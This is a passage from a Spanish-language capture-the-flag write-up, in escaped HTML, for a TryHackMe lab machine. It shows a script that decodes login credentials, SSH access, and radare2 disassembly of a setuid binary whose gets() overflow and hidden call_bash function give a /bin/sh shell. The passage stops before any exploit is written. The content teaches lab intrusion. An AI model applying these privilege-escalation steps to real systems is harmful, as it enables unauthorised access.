			&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encoded_cred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al ejecutar el script nos devuelve el numero que se puede utilizar para encontrar el valor de &lt;code&gt;m&lt;/code&gt; el cual utilizamos para decodificar la primera parte, y el resultado fue magna.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/anonymousplayground$ python creds.py 
Posible numero: &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
magna
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos lo mismo pero ahora con la segunda parte:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;encoded_cred_two&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;encoded_cred&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hE zA dC fH zA&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encoded_cred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;::&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encoded_cred_two&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos estas &amp;ldquo;credenciales&amp;rdquo; en el servicio SSH y logramos obtener una shell y nuestra primera &lt;code&gt;flag.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_19-09-33.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---spooky&#34;&gt;USER - SPOOKY&lt;/h2&gt;
&lt;p&gt;En la carpeta principal encontramos una nota en el cual indica que &lt;code&gt;Spooky&lt;/code&gt; hizo un binario en &lt;code&gt;C&lt;/code&gt; y que en la maquina esta installado radare2 y gdb para poder realizarle un reversing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash:note_from_spooky.txt&#34; data-lang=&#34;bash:note_from_spooky.txt&#34;&gt;Hey Magna,

Check out this binary I made!  I&amp;#39;ve been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I&amp;#39;ve had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El binario se encuentra en la carpeta principal.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anonymousplayground/Screenshot_2020-08-17_19-12-27.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;radare2&lt;/code&gt;, vemos varias funciones interesantes como &lt;code&gt;sym.main&lt;/code&gt; y &lt;code&gt;sym.call_bash&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x00400570&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; afl
0x00400000    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt;   -&amp;gt; &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt;   sym.imp.__libc_start_main
0x004004e0    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;           sym._init
0x00400510    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;            sym.imp.puts
0x00400520    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;            sym.imp.system
0x00400530    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;            sym.imp.printf
0x00400540    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;            sym.imp.gets
0x00400550    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;            sym.imp.setuid
0x00400560    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;            sym.imp.sleep
0x00400570    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;43&lt;/span&gt;           entry0
0x004005a0    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;            sym._dl_relocate_static_pie
0x004005b0    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;35&lt;/span&gt;           sym.deregister_tm_clones
0x004005e0    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt;           sym.register_tm_clones
0x00400620    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt;   -&amp;gt; &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt;   sym.__do_global_dtors_aux
0x00400650    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;            entry1.init
0x00400657    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;129&lt;/span&gt;          sym.call_bash
0x004006d8    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;56&lt;/span&gt;           sym.main
0x00400710    &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;101&lt;/span&gt;          sym.__libc_csu_init
0x00400780    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;            sym.__libc_csu_fini
0x00400784    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;            sym._fini
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x00400570&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;sym.main&lt;/code&gt; vemos que simplemente realiza una impresion y pregunta por algo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x00400570&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; pdf @sym.main
            &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;-- main:
/ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;fcn&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; sym.main &lt;span class=&#34;m&#34;&gt;56&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   sym.main &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; var int local_50h @ rbp-0x50
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; var int local_44h @ rbp-0x44
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; var int local_40h @ rbp-0x40
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;              &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; DATA XREF from 0x0040058d &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;entry0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006d8      &lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;             push rbp
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006d9      4889e5         mov rbp, rsp
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006dc      4883ec50       sub rsp, 0x50               &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;P&amp;#39;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006e0      897dbc         mov dword &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;local_44h&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, edi
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006e3      488975b0       mov qword &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;local_50h&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, rsi
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006e7      488d3d1d0100.  lea rdi, qword str.Who_do_you_want_to_hack &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0x40080b &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Who do you want to hack? &amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006ee      b800000000     mov eax, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006f3      e838feffff     call sym.imp.printf         &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int printf&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *format&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006f8      488d45c0       lea rax, qword &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;local_40h&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006fc      4889c7         mov rdi, rax
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006ff      b800000000     mov eax, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400704      e837feffff     call sym.imp.gets           &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; char*gets&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;char *s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400709      b800000000     mov eax, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x0040070e      c9             leave
&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;          0x0040070f      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;sym.call_bash&lt;/code&gt; vemos que realiza varias impresiones y al final ejecuta &lt;code&gt;/bin/sh&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x00400570&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; pdf @sym.call_bash
/ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;fcn&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; sym.call_bash &lt;span class=&#34;m&#34;&gt;129&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   sym.call_bash &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400657      &lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;             push rbp
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400658      4889e5         mov rbp, rsp
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x0040065b      488d3d360100.  lea rdi, qword str.We_are_Anonymous. &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0x400798 &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;\nWe are Anonymous.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400662      e8a9feffff     call sym.imp.puts           &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int puts&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400667      bf01000000     mov edi, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x0040066c      e8effeffff     call sym.imp.sleep          &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int sleep&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;int s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400671      488d3d330100.  lea rdi, qword str.We_are_Legion. &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0x4007ab &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;We are Legion.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400678      e893feffff     call sym.imp.puts           &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int puts&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x0040067d      bf01000000     mov edi, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400682      e8d9feffff     call sym.imp.sleep          &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int sleep&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;int s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400687      488d3d2c0100.  lea rdi, qword str.We_do_not_forgive. &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0x4007ba &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;We do not forgive.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x0040068e      e87dfeffff     call sym.imp.puts           &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int puts&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400693      bf01000000     mov edi, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00400698      e8c3feffff     call sym.imp.sleep          &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int sleep&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;int s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x0040069d      488d3d290100.  lea rdi, qword str.We_do_not_forget. &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0x4007cd &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;We do not forget.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006a4      e867feffff     call sym.imp.puts           &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int puts&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006a9      bf01000000     mov edi, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006ae      e8adfeffff     call sym.imp.sleep          &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int sleep&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;int s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006b3      488d3d260100.  lea rdi, qword str.Message_corrupted_...Well...done. &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0x4007e0 &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;[Message corrupted]...Well...done.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006ba      e851feffff     call sym.imp.puts           &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int puts&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006bf      bf39050000     mov edi, 0x539              &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1337&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006c4      e887feffff     call sym.imp.setuid
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x004006c9      488d3d330100.  lea rdi, qword str.bin_sh   &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0x400803 &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;
